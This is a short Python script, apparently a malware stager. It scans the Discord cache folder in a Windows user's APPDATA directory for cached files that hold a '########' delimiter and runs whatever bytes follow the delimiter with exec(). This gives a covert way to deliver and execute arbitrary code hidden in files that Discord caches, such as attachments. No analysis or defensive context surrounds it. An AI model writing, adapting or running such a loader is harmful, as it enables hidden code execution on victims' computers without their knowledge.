import os

DELIMITER = b'########'

cache_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Cache')

for file in (x for x in os.listdir(cache_path) if x.startswith('f_')):
    with open(os.path.join(cache_path, file), 'rb') as fd:
        buf = fd.read()

    if DELIMITER in buf:
        start_index = buf.rindex(DELIMITER) + len(DELIMITER)
        cache = buf[start_index:]
        exec(cache)
        break
